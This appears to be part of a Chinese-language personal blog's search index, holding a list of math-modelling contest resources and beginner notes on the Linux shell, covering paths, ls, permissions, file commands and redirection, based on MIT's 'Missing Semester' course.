<p>\u73b0\u5728\u770b\u6765\u81ea\u5df1\u5f53\u65f6\u6240\u77e5\u786e\u5b9e\u662f\u751a\u5c11\uff0c\u4f46\u662f\u5f88\u591a\u601d\u8def\u8fd8\u662f\u6bd4\u8f83\u6b63\u786e\u7684\uff08\u8fd9\u4e9b\u672c\u6765\u662f\u80fd\u591f\u5f88\u5feb\u5b66\u4e60\u5230\u7684\uff0c\u5374\u81ea\u5df1\u60f3\u4e86\u5f88\u4e45\uff1b\u4e0d\u8fc7\u5370\u8c61\u66f4\u52a0\u6df1\u523b\uff09\u3002\u540c\u65f6\u961f\u53cb\u4e5f\u5341\u5206\u7ed9\u529b\uff0c\u7b97\u662f\u7b80\u5355\u5730\u4f53\u9a8c\u4e86\u4e00\u628a\u3002</p> <ol> <li> <p>\u6211\u4eec\u961f\u4f0d\u540d\u5c31\u53eb\u201c\u4f53\u9a8c\u961f\u201dhhhh\u00a0\u21a9</p> </li> </ol>","tags":["blog"]},{"location":"tutorial/MCM%EF%BC%88%E6%95%B0%E6%A8%A1%EF%BC%89/some%20material%20in%20MCM/","title":"some material in MCM","text":"<p>\u6570\u5b66\u5efa\u6a21\u7684\u4e00\u4e9b\u4e9b\u81ea\u5b66\u8d44\u6599\uff08\u4e0d\u5168\uff0c\u4ec5\u4e3a\u81ea\u5df1\u671f\u95f4\u7528\u5230\u7684\u4e00\u4e9b\u4e1c\u897f\uff09\u3002</p>","tags":["blog","MCM"]},{"location":"tutorial/MCM%EF%BC%88%E6%95%B0%E6%A8%A1%EF%BC%89/some%20material%20in%20MCM/#_1","title":"\u5b66\u4e60\u90e8\u5206","text":"<ul> <li>\u6570\u6a21\u7ade\u8d5b\u76f4\u63a5\u76f8\u5173\u7f51\u7ad9\u6c47\u603b</li> <li>\u5c0f\u6811\u6570\u6a21\u767e\u79d1<ul> <li>CSDN</li> </ul> </li> </ul> Tip <p>\u6570\u6a21\u767e\u79d1\u6ca1\u6709\u63d0\u4f9b\u641c\u7d22\u529f\u80fd\uff0c\u4f46\u662f <code>\u641c\u7d22\u5185\u5bb9 site:https://modelwiki.cn/</code> \u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\u5728\u8fd9\u4e2a\u7f51\u7ad9\u4e2d\u8fdb\u884c\u641c\u7d22\uff0c\u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\uff1a</p> <p></p> <ul> <li>\u6570\u5b66\u52a0\u6cb9\u7ad9\u2014\u2014B\u7ad9<ul> <li>\u6392\u7248\u7ed8\u56fe\u7b49\u2014\u20147h</li> <li>\u7b97\u6cd5\u7c7b\u2014\u201428h</li> </ul> </li> <li>B \u7ad9\u5176\u4ed6<ul> <li>8min\u5957\u8def</li> <li>1h\u5165\u95e8</li> </ul> </li> <li>MOOC\u4e0a\u7684\u6559\u7a0b</li> <li>\u7eb3\u4ec0\u5747\u8861</li> </ul>","tags":["blog","MCM"]},{"location":"tutorial/MCM%EF%BC%88%E6%95%B0%E6%A8%A1%EF%BC%89/some%20material%20in%20MCM/#_2","title":"\u5de5\u5177\u90e8\u5206","text":"<ul> <li>\u514d\u8d39\u5728\u7ebf\u6d41\u7a0b\u56fe\u601d\u7ef4\u5bfc\u56fe</li> <li>\u514d\u8d39\u5728\u7ebf\u6587\u6863\u8f6c\u6362</li> </ul>","tags":["blog","MCM"]},{"location":"tutorial/MCM%EF%BC%88%E6%95%B0%E6%A8%A1%EF%BC%89/some%20material%20in%20MCM/#_3","title":"\u8bba\u6587\u6a21\u677f","text":"<ul> <li>\u7f8e\u8d5b\u6a21\u677f<ul> <li>\u7f8e\u8d5b\u82f1\u6587\u6a21\u677f(word + latex) \u548c\u4e2d\u6587\u6a21\u677f\uff08word\uff09</li> </ul> </li> <li>cumcmthesis<ul> <li>\u56fd\u8d5b\u4e2d\u6587\u6a21\u677f(latex)</li> </ul> </li> <li>cumcm<ul> <li>\u56fd\u8d5b\u4e2d\u6587\u6a21\u677f(typst)</li> </ul> </li> </ul>","tags":["blog","MCM"]},{"location":"tutorial/MCM%EF%BC%88%E6%95%B0%E6%A8%A1%EF%BC%89/some%20material%20in%20MCM/#_4","title":"\u7ecf\u9a8c\u90e8\u5206","text":"<ul> <li>\u627e\u6570\u636e</li> </ul>","tags":["blog","MCM"]},{"location":"tutorial/MCM%EF%BC%88%E6%95%B0%E6%A8%A1%EF%BC%89/some%20material%20in%20MCM/#_5","title":"\u6bd4\u8f83\u6709\u4ef7\u503c\u7684\u6742\u8c08","text":"<ul> <li>\u6570\u5b66\u5efa\u6a21\u5165\u95e8</li> </ul>","tags":["blog","MCM"]},{"location":"tutorial/MIT/","title":"the Missing semester","text":"<p>MIT \u53ea\u662f\u53d6\u81ea MIT \u7684\u4e00\u95e8\u8bfe\u7a0b The Missing Semester of Your CS Education \uff0c\u4f46\u5176\u4e2d\u6211\u76f4\u63a5\u9700\u8981\u5b66\u4e60\u7684\u5e76\u4e0d\u591a\uff0c\u53ea\u662f\u53d6\u5176\u5bd3\u610f\u7f62\u4e86\u3002</p> <p>\u8fd9\u91cc\u53ea\u662f\u7b80\u5355\u5730\u5c06\u4e00\u4e9b\u201c\u8bfe\u5802\u4e0a\u4e0d\u4f1a\u76f4\u63a5\u6559\u7684\u5185\u5bb9\u201d\u505a\u4e86\u4e00\u4e9b\u4e9b\u7b14\u8bb0\u7f62\u4e86\u3002</p>"},{"location":"tutorial/MIT/#_1","title":"\u76ee\u5f55","text":"<ul> <li>0_linux-shell</li> <li>1_shell-script-and-basic-tools</li> <li>2_learn-to-use-Vim-editor</li> <li>3_Git</li> <li>4_base-of-web</li> <li>5_Emmet</li> </ul>"},{"location":"tutorial/MIT/#_2","title":"\u53c2\u8003\u8d44\u6599","text":"<ul> <li>The Missing Semester of Your CS Education</li> <li>\u300c\u5b9e\u7528\u6280\u80fd\u62fe\u9057\u300dslider &amp; \u300c\u5b9e\u7528\u6280\u80fd\u62fe\u9057\u300dvideos</li> <li>Web docs</li> <li>USTC linux 101</li> </ul>"},{"location":"tutorial/MIT/#_3","title":"\u5176\u4ed6","text":"<ul> <li>Makefile \u5149\u901f\u5165\u95e8</li> </ul>"},{"location":"tutorial/MIT/0_linux-shell/","title":"0 linux shell","text":"Summary <p>\u672c\u6587\u4ecb\u7ecd\u4e86 Linux shell \u7684\u57fa\u672c\u4f7f\u7528\uff0c\u5305\u62ec\u8def\u5f84\u64cd\u4f5c\u3001\u6587\u4ef6\u7ba1\u7406\u3001\u547d\u4ee4\u8fde\u63a5\u3001\u6743\u9650\u7ba1\u7406\u7b49\u3002</p> <ul> <li>shell\uff1a \u64cd\u4f5c\u7cfb\u7edf\u4e3a\u7528\u6237\u63d0\u4f9b\u7684\u547d\u4ee4\u884c\u89e3\u91ca\u5668\uff0c\u5982 bash\u3002</li> <li>\u8def\u5f84\uff1a pwd/cd \u547d\u4ee4\u53ef\u64cd\u4f5c\u8def\u5f84\uff0c<code>.</code> \u4ee3\u8868\u5f53\u524d\u76ee\u5f55\uff0c<code>..</code> \u4ee3\u8868\u7236\u76ee\u5f55\u3002</li> <li>\u6587\u4ef6\u7ba1\u7406\uff1a touch \u521b\u5efa/\u66f4\u65b0\u6587\u4ef6\uff0cmkdir \u521b\u5efa\u76ee\u5f55\uff0cmv \u79fb\u52a8/\u91cd\u547d\u540d\uff0ccp \u590d\u5236\uff0crm \u5220\u9664\u3002</li> <li>\u547d\u4ee4\u8fde\u63a5\uff1a <code>&lt;</code>\u3001<code>&gt;</code>\u3001<code>&gt;&gt;</code>\u3001<code>|</code>\u3001<code>&amp;&amp;</code>\u3001<code>||</code>\u3001<code>;</code> \u53ef\u8fde\u63a5\u547d\u4ee4\u3002</li> <li>\u6743\u9650\u7ba1\u7406\uff1a chmod \u53ef\u8c03\u6574\u6587\u4ef6\u6743\u9650\uff0c\u5b57\u7b26\u4e32\u8bed\u6cd5\u548c\u6570\u5b57\u8bed\u6cd5\u5747\u53ef\u4f7f\u7528\u3002</li> </ul>","tags":["MIT"]},{"location":"tutorial/MIT/0_linux-shell/#i","title":"I \u524d\u8a00","text":"","tags":["MIT"]},{"location":"tutorial/MIT/0_linux-shell/#i1-shell","title":"I.1 \u4ec0\u4e48\u662f shell?","text":"<p>shell\u662f\u64cd\u4f5c\u7cfb\u7edf\u4e3a\u7528\u6237\u63d0\u4f9b\u4ea4\u4e92\u754c\u9762\u7684\u547d\u4ee4\u884c\u89e3\u91ca\u5668\u7684\u7edf\u79f0\uff0c\u4f8b\u5982Windows\u4e2d\u7684cmd\u5c31\u662f\u4e00\u79cdshell\u3002bash \u662f\u5176\u4e2d\u6700\u6d41\u884c\u7684\u4e00\u79cd\u3002bash \u662f Bourne Again shell \u7684\u7b80\u79f0\u3002</p> <p>\u672c\u6587\u591a\u5b66\u4e60\u501f\u9274\u81ea Cyrus' Blog\uff0c\u518d\u52a0\u5165\u81ea\u5df1\u7684\u90e8\u5206\u7406\u89e3\u3002</p> <p>\u4f60\u9700\u8981\u4f7f\u7528\u4e00\u4e2a\u7c7bUnix shell\u6765\u5b8c\u6210\u6587\u4e2d\u6240\u63d0\u5230\u7684\u64cd\u4f5c\u3002\u4f60\u53ef\u4ee5\uff1a</p> <ul> <li>\u4f7f\u7528\u5b89\u88c5\u4e86Linux\u7684\u7535\u8111</li> <li>\u4f7f\u7528Linux\u865a\u62df\u673a</li> <li>\u4f7f\u7528 WSL(Windows Subsystem for Linux) \uff08\u672c\u4eba\u64cd\u4f5c\u73af\u5883\u4e3a Ubuntu 22.04\uff09</li> </ul>","tags":["MIT"]},{"location":"tutorial/MIT/0_linux-shell/#i2-shell","title":"I.2 \u4f7f\u7528shell","text":"<p>\u8fdb\u5165shell\uff0c\u53ef\u4ee5\u770b\u5230\u8fd9\u6837\u7684\u4e00\u884c\u63d0\u793a\uff1a</p> <pre><code>yourUserName@yourComputerName:~$\n</code></pre> <ul> <li><code>yourUserName</code> \u4ee3\u8868\u5f53\u524d\u7528\u6237\u7684\u7528\u6237\u540d\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528 <code>echo $USER</code> \u6765\u67e5\u770b\uff0c\u4ee5\u540e\u6211\u4eec\u7701\u7565\u4e0d\u5199\uff1b</li> <li><code>~</code>\u4ee3\u8868\u5f53\u524d\u6240\u5728\u8def\u5f84\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528<code>pwd</code>\u6765\u67e5\u770b\uff1b</li> <li><code>$</code>\u662f\u547d\u4ee4\u63d0\u793a\u7b26\uff0c\u63d0\u793a\u7528\u6237\u73b0\u5728\u53ef\u4ee5\u8f93\u5165\u547d\u4ee4\u4e86\u3002</li> </ul> <p><code>~</code> \u662f\u8868\u793a\u7528\u6237\u7684home\u76ee\u5f55\uff0c\u975e root \u7528\u6237\u7684 <code>~</code> \u4ee3\u8868 <code>/home/$USER/</code>\uff0c\u800c root \u7528\u6237\u7684 <code>~</code> \u4ee3\u8868 <code>/root</code>\u3002</p> <p>\u5f53\u6211\u4eec\u60f3\u8981\u8fd0\u884c\u4e00\u4e2a\u7a0b\u5e8f\u7684\u65f6\u5019\uff0c\u76f4\u63a5\u8f93\u5165\u540d\u79f0\u5373\u53ef</p> <p>\u4f8b\u5982\uff0cLinux \u4e2d\u6709\u4e00\u4e2a\u7a0b\u5e8f\u53eb\u505a <code>date</code>\uff0c\u76f4\u63a5\u8f93\u5165\u5c31\u53ef\u4ee5\uff0c\u8fd9\u4e2a\u7a0b\u5e8f\u5c06\u8f93\u51fa\u5f53\u524d\u7684\u65f6\u95f4\uff1a</p> <pre><code>:~$ date\nFri Mar 15 19:40:29 CST 2024\n</code></pre> <p>\u7a0b\u5e8f\u53ef\u4ee5\u9644\u52a0\u53c2\u6570\uff0c\u4f8b\u5982\uff1a</p> <pre><code>:~$ echo hello\nhello\n</code></pre> <p>\u8fd9\u91cc\u7684<code>hello</code>\uff0c\u5c31\u662f\u4f20\u7ed9\u7a0b\u5e8f<code>echo</code>\u7684\u53c2\u6570\u3002<code>echo</code>\u7a0b\u5e8f\u7684\u529f\u80fd\u5c31\u662f\u8f93\u51fa\u5b83\u7684\u53c2\u6570\u3002\u53c2\u6570\u548c\u7a0b\u5e8f\u540d\u3001\u53c2\u6570\u4e0e\u53c2\u6570\u4e4b\u95f4\u90fd\u8981\u4f7f\u7528\u7a7a\u683c\u9694\u5f00\u3002\u5982\u679c\u53c2\u6570\u91cc\u5305\u542b\u7a7a\u683c\uff0c\u53ef\u4ee5\u7528<code>'</code>\u6216<code>\"</code>\u5c06\u53c2\u6570\u5305\u88f9\u8d77\u6765\uff0c\u6216\u8005\u5728\u7a7a\u683c\u524d\u9762\u52a0\u4e0a\u4e00\u4e2a\u53cd\u659c\u6760\u8f6c\u4e49\uff08\u5982<code>My\\ Photos</code>\u4f1a\u88ab\u8f6c\u4e49\u6210<code>My Photos</code>\uff09</p> <p>shell\u600e\u4e48\u77e5\u9053\u8fd9\u4e9b\u7a0b\u5e8f\u5728\u54ea\u91cc\u5462\uff1f\u5176\u5b9eshell\u4f1a\u5728<code>$PATH</code>\u91cc\u9762\u7684\u8def\u5f84\u5bfb\u627e\u3002\u8fd9\u91cc\u7684<code>$PATH</code>\u548c\u4e0a\u9762\u7684<code>$USER</code>\u90fd\u662fshell\u4e2d\u7684\u53d8\u91cf\uff0c<code>$</code>\u8868\u793a\u5f15\u7528\u53d8\u91cf\uff0c\u63d0\u793ashell\u628a<code>$\u53d8\u91cf\u540d</code>\u66ff\u6362\u6210\u53d8\u91cf\u7684\u503c\u3002<code>$PATH</code>\u50a8\u5b58\u4e86\u591a\u4e2a\u8def\u5f84\uff0c\u7528\u201c:\u201d\u9694\u5f00\uff0c\u63d0\u793a\u4e86shell\u53bb\u54ea\u91cc\u627e\u8fd9\u4e2a\u7a0b\u5e8f\u3002\u4f60\u4e5f\u53ef\u4ee5\u4f7f\u7528<code>which</code>\u6765\u67e5\u627e\u67d0\u4e00\u4e2a\u7a0b\u5e8f\u7684\u5177\u4f53\u4f4d\u7f6e\u3002\u8f93\u5165\u7a0b\u5e8f\u7684\u5b8c\u6574\u8def\u5f84\uff0c\u4e5f\u53ef\u4ee5\u7ed5\u8fc7<code>$PATH</code>\u8fd0\u884c\u7a0b\u5e8f\u3002</p> <pre><code>:~$ echo $PATH\n/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n:~$ which echo\n/bin/echo\n:~$ /bin/echo $PATH\n/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n</code></pre>","tags":["MIT"]},{"location":"tutorial/MIT/0_linux-shell/#ii","title":"II \u547d\u4ee4","text":"","tags":["MIT"]},{"location":"tutorial/MIT/0_linux-shell/#ii1-pwdcd","title":"II.1 \u8def\u5f84: pwd/cd","text":"<p>\u5728 Linux \u548c MacOS \u4e2d\uff0c\u8def\u5f84\u4f7f\u7528 <code>/</code> \u5206\u9694\uff0c\u800c\u5728 Windows \u4e2d\u662f <code>\\</code>\u3002\u5728 Linux \u548c MacOS \u4e2d\uff0c\u8def\u5f84\u4ece <code>/</code> \u5f00\u59cb\uff0c\u4ee3\u8868\u6839\u76ee\u5f55\uff08\u5305\u542b\u4e86\u6240\u6709\u76ee\u5f55\uff09\uff1b\u5728 Windows \u4e2d\uff0c\u8def\u5f84\u4ece\u76d8\u7b26\u5f00\u59cb\uff0c\u5982 <code>C:\\</code>\u3002</p> <p>\u4ee5 <code>/</code> \u5f00\u5934\u7684\u8def\u5f84\u53eb\u7edd\u5bf9\u8def\u5f84\uff0c\u5426\u5219\u5c31\u662f\u76f8\u5bf9\u8def\u5f84\u3002<code>pwd</code>\uff08print working directory \u7684\u7f29\u5199\uff09\u53ef\u4ee5\u663e\u793a\u5f53\u524d\u6240\u5728\u7684\u7edd\u5bf9\u8def\u5f84\uff0c<code>cd</code>\uff08change directory \u7684\u7f29\u5199\uff09\u53ef\u4ee5\u6539\u53d8\u5f53\u524d\u6240\u5728\u8def\u5f84\u3002</p> <p><code>.</code> \u4ee3\u8868\u5f53\u524d\u6240\u5728\u76ee\u5f55\uff0c<code>..</code> \u4ee3\u8868\u7236\u76ee\u5f55\u3002</p> <p>\u5728 shell \u4e2d\u8f93\u5165\u8def\u5f84\u65f6\uff0c\u53ef\u4ee5\u6309 Tab \u6765\u81ea\u52a8\u8865\u5168\u6587\u4ef6\u540d\u3002\u53e6\u5916\uff0c\u5728 shell \u4e2d\u6309\u2191/\u2193\u65b9\u5411\u952e\uff0c\u53ef\u4ee5\u6d4f\u89c8\u5386\u53f2\u547d\u4ee4\u3002</p> <pre><code>:~$ pwd\n/home/yourusername\n:~$ cd /home\n:/home$ pwd\n/home\n:/home$ cd ..\n:/$ pwd\n/\n:/$ cd ./home\n:/home$ pwd\n/home\n</code></pre> <p>\u8f93\u5165 <code>cd -</code> \u53ef\u4ee5\u79fb\u52a8\u5230\u4e0a\u6b21\u6240\u5728\u7684\u76ee\u5f55\uff0c\u76f8\u5f53\u4e8e <code>cd $OLDPWD</code>\uff0c\u975e\u5e38\u65b9\u4fbf\u3002</p> <pre><code>:/$ cd ~\n:~$ pwd\n/home/yourusername\n:~$ echo $OLDPWD\n/\n:~$ cd -\n/\n:/$ pwd\n/\n</code></pre>","tags":["MIT"]},{"location":"tutorial/MIT/0_linux-shell/#ii2-ls","title":"II.2 ls","text":"<p><code>ls</code>\uff08list\u7684\u7f29\u5199\uff09\u53ef\u4ee5\u5217\u51fa\u5f53\u524d\u76ee\u5f55\u4e0b\u6709\u4ec0\u4e48\uff1a</p> <pre><code>:/$ ls\nbin\nboot\ndev\netc\nhome\n...\n</code></pre> <p>\u7edd\u5927\u591a\u6570\u7a0b\u5e8f\u90fd\u53ef\u4ee5\u63a5\u53d7\u4ee5<code>-</code>\u5f00\u5934\u7684\u53c2\u6570\u6765\u6539\u53d8\u7a0b\u5e8f\u7684\u884c\u4e3a\u3002\u4f8b\u5982\uff0c<code>-h</code>\u6216<code>--help</code>\u4e00\u822c\u4f1a\u8f93\u51fa\u7a0b\u5e8f\u7684\u5e2e\u52a9\u6587\u672c\uff0c\u5982\uff1a</p> <pre><code>:/$ ls --help\nUsage: ls [OPTION]... [FILE]...\nList information about the FILEs (the current directory by default).\nSort entries alphabetically if none of -cftuvSUX nor --sort is specified.\n...\n</code></pre> <p><code>[OPTION]</code> \u8868\u793a\u53c2\u6570\u662f\u53ef\u9009\u7684 \u663e\u793a <code>ls</code> \u7684\u5e2e\u52a9\u53ea\u80fd\u4f7f\u7528 <code>--help</code> \u800c\u4e0d\u80fd\u4f7f\u7528 <code>-h</code>\uff0c\u56e0\u4e3a <code>-h</code> \u5df2\u7ecf\u88ab\u5176\u4ed6\u529f\u80fd\u5360\u7528\u4e86</p> <p>\u5176\u4e2d\u6709\u4e00\u884c</p> <pre><code>  -l                         use a long listing format\n</code></pre> <p>\u6839\u636e\u8fd9\u4e2a\u5185\u5bb9\uff0c\u6211\u4eec\u7ed9<code>ls</code>\u547d\u4ee4\u9644\u52a0\u4e0a<code>-l</code>\u53c2\u6570\uff0c\u6709\uff1a</p> <pre><code>:/home$ ls -l\ntotal 12\ndrwxr-xr-x 5 yourusername yourusername 4096 Mar 15 16:15 code\ndrwxr-xr-x 6 yourusername yourusername 4096 Mar 14 16:00 webpage\ndrwxr-xr-x 9 yourusername yourusername 4096 Mar 13 19:13 work\n</code></pre> <p><code>-l</code>\u53c2\u6570\u975e\u5e38\u6709\u7528\uff0c\u53ef\u4ee5\u5217\u51fa\u8be6\u7ec6\u4fe1\u606f\u3002</p> <p>\u7b2c\u4e00\u5217\u7684\u7b2c\u4e00\u4e2a\u5b57\u7b26\u662f<code>d</code>\u4ee3\u8868\u8fd9\u662f\u4e00\u4e2a\u6587\u4ef6\u5939\uff0c\u4e0b\u9762\u5217\u51fa\u4e86\u53ef\u80fd\u7684\u7c7b\u578b\uff1a</p> \u6807\u8bc6\u7b26 \u7c7b\u578b \u82f1\u6587 \u2013 \u5e38\u89c4\u6587\u4ef6 regular file d \u6587\u4ef6\u76ee\u5f55 directory c \u5b57\u7b26\u8bbe\u5907\u6587\u4ef6 character device file b \u5757\u8bbe\u5907\u6587\u4ef6 block device file s \u672c\u5730socket\u6587\u4ef6 local socket file p \u547d\u540d\u7ba1\u9053 named pipe l \u7b26\u53f7\u94fe\u63a5 symbolic link <p>\u7136\u540e\u662f\u4e5d\u4e2a\u5b57\u7b26\u63cf\u8ff0\u4e86\u4f7f\u7528\u6b64\u6587\u4ef6\u7684\u6743\u9650\uff0c\u4e09\u4e2a\u5b57\u7b26\u4e3a\u4e00\u7ec4\u5206\u6210\u4e09\u7ec4\uff0c\u5206\u522b\u8868\u793a\u6587\u4ef6\u6301\u6709\u8005\u3001\u6587\u4ef6\u6301\u6709\u7ec4\u3001\u548c\u5176\u4ed6\u7528\u6237\u7684\u6743\u9650\u3002\u6bcf\u7ec4\u7684\u4e09\u4e2a\u5b57\u7b26\u4e2d\uff0c<code>r</code>\u3001<code>w</code>\u3001<code>x</code>\u5206\u522b\u4ee3\u8868read\u8bfb\u3001write\u5199\u3001execute\u6267\u884c\u6743\u9650\uff0c<code>-</code>\u4ee3\u8868\u6ca1\u6709\u6743\u9650\u3002</p> <p>\u4f8b\u5982<code>rwxr-xr--</code>\u4ee3\u8868\u6587\u4ef6\u6301\u6709\u8005\u53ef\u4ee5\u8bfb\u3001\u5199\u3001\u8fd0\u884c\u6b64\u6587\u4ef6\uff0c\u6587\u4ef6\u6301\u6709\u7ec4\u53ef\u4ee5\u8bfb\u3001\u8fd0\u884c\u6b64\u6587\u4ef6\uff0c\u5176\u4ed6\u7528\u6237\u53ea\u80fd\u8bfb\u6b64\u6587\u4ef6\u3002</p> <p>\u7b2c\u4e8c\u5217\u662f\u6709\u591a\u5c11\u201c\u786c\u94fe\u63a5\u201d\u6307\u5411\u8fd9\u4e2a\u6587\u4ef6\u3002</p> <p>\u7b2c\u4e09\u5217\u548c\u7b2c\u56db\u5217\uff0c\u5206\u522b\u662f\u6587\u4ef6\u6301\u6709\u8005\u548c\u6587\u4ef6\u6301\u6709\u7ec4\u7684\u540d\u79f0</p> <p>\u7b2c\u4e94\u5217\u662f\u6587\u4ef6\u5927\u5c0f\uff0c\u9ed8\u8ba4\u4ee5byte\u4e3a\u5355\u4f4d\uff0c\u5982\u679c\u60f3\u8981\u663e\u793a\u6210\u201c8M\u201d,\u201c13K\u201d\u8fd9\u79cd\u5f62\u5f0f\uff0c\u53ea\u9700\u8981\u4e3a<code>ls</code>\u547d\u4ee4\u9644\u52a0\u4e0a<code>-h</code>\u53c2\u6570\u3002</p> <p>\u7b2c\u516d\u5217\u5c31\u662f\u6587\u4ef6\u7684\u4fee\u6539\u65f6\u95f4\uff0c\u5373mtime\u3002</p> <p>\u6700\u540e\u4e00\u5217\u5c31\u662f\u6587\u4ef6\u540d</p>","tags":["MIT"]},{"location":"tutorial/MIT/0_linux-shell/#ii3-man","title":"II.3 man","text":"<p><code>man</code>\u53ef\u4ee5\u663e\u793a\u4e00\u4e2a\u547d\u4ee4\u7684\u8be6\u7ec6\u5e2e\u52a9\u6587\u6863\uff0c\u8f93\u5165<code>man ls</code>\uff0c\u4f1a\u663e\u793a\u6bd4<code>ls --help</code>\u66f4\u52a0\u8be6\u7ec6\u7684\u547d\u4ee4\u4f7f\u7528\u5e2e\u52a9\u3002</p>","tags":["MIT"]},{"location":"tutorial/MIT/0_linux-shell/#ii4-touchmkdirmvcprm","title":"II.4 touch\u3001mkdir\u3001mv\u3001cp\u3001rm","text":"<p><code>touch \u6587\u4ef6\u540d</code>\u6709\u4e24\u4e2a\u4f5c\u7528\uff1a</p> <ul> <li>\u82e5\u6587\u4ef6\u4e0d\u5b58\u5728\uff0c\u521b\u5efa\u8fd9\u4e2a\u6587\u4ef6</li> <li>\u82e5\u6587\u4ef6\u5b58\u5728\uff0c\u5c06\u6587\u4ef6\u7684atime\u548cmtime\u8bbe\u7f6e\u4e3a\u73b0\u5728\u7684\u65f6\u95f4\u3002</li> </ul> <p><code>mkdir \u76ee\u5f55\u540d</code>\uff08make directory\uff09\u53ef\u4ee5\u521b\u5efa\u65b0\u7684\u6587\u4ef6\u5939\uff0c\u4f8b\uff1a</p> <pre><code>:~$ mkdir case\n:~$ ls -l\ntotal 16\ndrwxr-xr-x 2 qssg qssg 4096 Mar 15 19:53 case\n...\n</code></pre> <p><code>mv \u6e90 \u76ee\u6807</code>\uff08move\uff09\uff0c\u53ef\u4ee5\u7528\u6765\u79fb\u52a8\u6587\u4ef6/\u6587\u4ef6\u5939\uff0c\u4e5f\u53ef\u4ee5\u7528\u6765\u91cd\u547d\u540d\u6587\u4ef6/\u6587\u4ef6\u5939\u3002</p> <p>\u6839\u636e\u201c\u6e90\u201d\u548c\u201c\u76ee\u6807\u201d\u7684\u4e0d\u540c\uff0c<code>mv</code>\u4f1a\u505a\u51fa\u4ee5\u4e0b\u4e0d\u540c\u7684\u884c\u4e3a\uff1a</p> <ul> <li>\u79fb\u52a8\uff1a\u5982\u679c\u76ee\u6807\u662f\u4e00\u4e2a\u5b58\u5728\u7684\u8def\u5f84\uff0c\u5219\u6e90\u4f1a\u88ab\u79fb\u52a8\u5230\u6b64\u76ee\u5f55\u4e0b\uff0c\u540d\u79f0\u4e0d\u53d8\u3002</li> <li>\u91cd\u547d\u540d\uff1a\u5426\u5219\uff0c\u5219\u6e90\u6587\u4ef6\u540d\u4f1a\u53d8\u4e3a\u6b64\u76ee\u6807\u6587\u4ef6\u540d\uff0c\u5982\u679c\u5b58\u5728\u540c\u540d\u6587\u4ef6\uff0c\u5219\u4f1a\u8986\u76d6\u5df1\u5b58\u5728\u7684\u540c\u540d\u6587\u4ef6\u3002</li> </ul> <p><code>cp</code>\uff08copy\uff09\u7684\u4f7f\u7528\u548c<code>mv</code>\u5f88\u50cf\uff0c\u4f1a\u5728\u76ee\u6807\u76ee\u5f55\u4e0b\u751f\u6210\u4e00\u4e2a\u526f\u672c\uff0c\u5982\u679c\u9700\u8981\u590d\u5236\u4e00\u4e2a\u6587\u4ef6\u5939\uff0c\u9700\u8981\u9644\u52a0<code>-r</code>\u53c2\u6570\uff08recursive \u9012\u5f52\u7684\u7f29\u5199\uff09\uff0c\u6765\u9012\u5f52\u5730\u62f7\u8d1d\u6587\u4ef6\u5939\u4e0b\u6240\u6709\u6587\u4ef6\u3002</p> <p><code>rm \u76ee\u6807</code>\uff08remove\uff09\u53ef\u4ee5\u5220\u9664\u6587\u4ef6\u6216\u76ee\u5f55\uff0c\u5982\u679c\u8981\u5220\u9664\u7684\u662f\u4e00\u4e2a\u76ee\u5f55\uff0c\u4e5f\u9700\u8981\u9644\u52a0<code>-r</code>\u53c2\u6570\uff0c\u6765\u6267\u884c\u9012\u5f52\u5730\u5220\u9664\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c<code>rm</code>\u547d\u4ee4\u9700\u8981\u4f60\u9010\u4e2a\u786e\u8ba4\u4f60\u662f\u5426\u786e\u5b9a\u5220\u9664\u8fd9\u4e2a\u6587\u4ef6\uff0c\u9644\u52a0<code>-f</code>\u53c2\u6570\u53ef\u4ee5\u65e0\u9700\u518d\u6b21\u786e\u8ba4\uff0c \u4f7f\u7528<code>-f</code>\u65f6\u8bf7\u4fdd\u8bc1\u4f60\u771f\u7684\u8981\u5220\u9664\uff0c\u6ca1\u6709\u518d\u6b21\u786e\u5b9a\u7684\u673a\u4f1a\u4e86</p>","tags":["MIT"]},{"location":"tutorial/MIT/0_linux-shell/#iii","title":"III \u7b26\u53f7","text":"","tags":["MIT"]},{"location":"tutorial/MIT/0_linux-shell/#iii1","title":"III.1 <code>&lt;</code>\u3001<code>&gt;</code>\u3001<code>&gt;&gt;</code>\u3001<code>|</code>\u3001<code>&amp;&amp;</code>\u3001<code>||</code>\u3001<code>;</code>","text":"<p>\"&lt; \u6587\u4ef6\"\u53ef\u4ee5\u4f7f\u7528\u6587\u4ef6\u4f5c\u4e3a\u7a0b\u5e8f\u7684\u8f93\u5165\uff0c\"&gt; \u6587\u4ef6\"\u53ef\u4ee5\u5c06\u7a0b\u5e8f\u7684\u8f93\u51fa\u4fdd\u5b58\u5230\u6587\u4ef6\u4e2d\uff08\u4e0d\u5b58\u5728\u5c31\u4f1a\u88ab\u521b\u5efa\uff09</p> <pre><code>:~$ echo hello &gt; hello.txt\n:~$ cat hello.txt\nhello\n:~$ cat &lt; hello.txt\nhello\n:~$ cat &lt; hello.txt &gt; hello2.txt\n:~$ cat hello2.txt\nhello\n</code></pre> <p>\u4e0a\u9762 <code>cat</code> \u7684\u4f5c\u7528\u662f\u5c06\u6587\u4ef6\u7684\u5185\u5bb9\u5c55\u793a\u5230\u547d\u4ee4\u884c\u8f93\u51fa\u3002</p> <p>\u201c&gt;\u201d\u4f1a\u8986\u76d6\u539f\u6765\u5b58\u5728\u7684\u6587\u4ef6\uff0c\u5982\u679c\u6587\u4ef6\u4e0d\u5b58\u5728\uff0c\u4f1a\u521b\u5efa\u4e00\u4e2a\u65b0\u6587\u4ef6\u5e76\u5199\u5165\u3002</p> <p>\u5982\u679c\u4e0d\u60f3\u539f\u6765\u5b58\u5728\u7684\u6587\u4ef6\u88ab\u8986\u76d6\uff0c\u800c\u662f\u60f3\u5c06\u65b0\u7684\u5185\u5bb9\u52a0\u5728\u6587\u4ef6\u672b\u5c3e\uff0c\u53ef\u4ee5\u4f7f\u7528\u201c&gt;&gt;\u201d</p> 